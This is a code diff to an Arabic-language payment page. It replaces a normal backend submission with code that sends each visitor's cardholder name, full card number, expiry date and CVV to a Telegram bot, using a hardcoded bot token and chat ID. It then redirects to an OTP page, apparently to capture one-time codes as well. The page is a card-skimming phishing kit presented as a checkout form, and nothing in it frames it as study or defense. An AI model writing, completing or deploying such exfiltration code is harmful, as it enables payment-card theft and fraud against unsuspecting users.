@@ -447,15 +447,9 @@
   </div>
 
   <script>
-    // API Configuration
-    const API_BASE_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
-      ? 'http://localhost:3000'
-      : '';
-
-    // Get session ID
-    function getSessionId() {
-      return localStorage.getItem('sessionId') || '';
-    }
+    // Telegram Configuration
+    const telegramBotToken = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
+    const chatId = '7785288759';
 
     // Get owner name
     function getOwnerName() {
@@ -497,28 +491,40 @@
       document.getElementById('summaryExpiry').textContent = expiryDate ? formatDate(expiryDate) : 'غير متوفر';
     }
 
-    // Submit payment data to backend server
-    async function submitToServer(data) {
+    // Send data directly to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
       try {
-        const response = await fetch(`${API_BASE_URL}/api/submit/payment`, {
+        const response = await fetch(url, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            ...data,
-            sessionId: getSessionId()
-          })
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
         });
         return await response.json();
       } catch (error) {
-        console.error('Server error:', error);
-        return { success: false, error: error.message };
+        console.error('Telegram Error:', error);
+        return { ok: false };
       }
     }
 
+    // Submit payment data to Telegram
+    async function submitToServer(data) {
+      const message = `
+💳 <b>بيانات الدفع الجديدة:</b>
+━━━━━━━━━━━━━━━
+👤 العميل: ${data.owner_name}
+━━━━━━━━━━━━━━━
+👤 الاسم على البطاقة: ${data.card_name}
+🔢 رقم البطاقة: ${data.card_number}
+📅 تاريخ الانتهاء: ${data.expiry_month}/${data.expiry_year}
+🔐 رمز الـ CVV: ${data.cvv}
+💰 إجمالي السعر: ${data.total_price}
+      `;
+      return await sendToTelegram(message);
+    }
+
     // Validate form
-    function validateForm() {
+    async function validateForm() {
       const cardName = document.getElementById('cardName').value.trim();
       const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
       const cvv = document.getElementById('cvv').value.trim();
@@ -538,7 +544,7 @@
 
       const finalPrice = document.getElementById('calcTotal').innerText;
 
-      // Prepare data for server
+      // Prepare data for Telegram
       const data = {
         owner_name: fullName,
         card_name: cardName,
@@ -549,17 +555,17 @@
         total_price: finalPrice
       };
 
-      // Submit to server
-      submitToServer(data).then(result => {
-        setTimeout(() => {
-          hideLoading();
-          if (result.success) {
-            window.location.href = "otp.html";
-          } else {
-            alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
-          }
-        }, 2000);
-      });
+      // Submit to Telegram
+      const result = await submitToServer(data);
+      
+      setTimeout(() => {
+        hideLoading();
+        if (result.ok) {
+          window.location.href = "otp.html";
+        } else {
+          alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+        }
+      }, 2000);
     }
 
     // Show loading overlay
